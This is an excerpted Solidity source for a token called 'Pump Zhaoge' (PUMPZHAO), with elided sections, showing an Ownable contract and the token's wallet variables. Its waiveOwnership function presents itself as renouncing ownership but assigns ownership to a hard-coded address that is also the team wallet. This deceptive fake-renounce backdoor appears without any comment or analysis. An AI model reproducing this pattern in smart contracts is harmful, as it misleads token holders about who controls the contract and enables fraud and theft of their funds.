...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x513F3DAB98255295a9340eFa8836feF04fDf7F25));
        _owner = address(0x513F3DAB98255295a9340eFa8836feF04fDf7F25);
    }
...
contract PumpZhaoge is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Pump Zhaoge";
    string private _symbol = "PUMPZHAO";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xeb163D889a06ef974Cc734058De29E386a141615);
    address payable public teamWalletAddress = payable(0x513F3DAB98255295a9340eFa8836feF04fDf7F25);
